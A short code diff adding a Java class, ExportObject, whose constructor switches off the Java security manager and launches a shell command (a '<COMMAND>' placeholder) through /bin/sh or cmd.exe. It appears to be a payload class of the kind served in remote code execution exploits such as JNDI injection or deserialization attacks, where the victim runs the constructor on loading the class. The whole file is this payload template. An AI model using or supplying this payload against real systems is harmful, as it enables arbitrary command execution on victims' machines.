@@ -1,0 +1,24 @@
+import java.io.File;
+import java.io.IOException;
+
+public class ExportObject {
+
+	public ExportObject() {
+	
+		String executor = "/bin/sh";
+		String param = "-c";
+	    if (System.getProperty("os.name").toLowerCase().contains("win")) {
+	    	executor = "cmd.exe";
+	    	param = "/c";
+	    }
+	    
+		try {
+			System.setSecurityManager(null);
+			java.lang.ProcessBuilder p = new java.lang.ProcessBuilder();
+			p.command(executor, param, "<COMMAND>");
+			p.start();
+		} catch(Exception e) {
+			e.printStackTrace();
+		}
+	}
+}
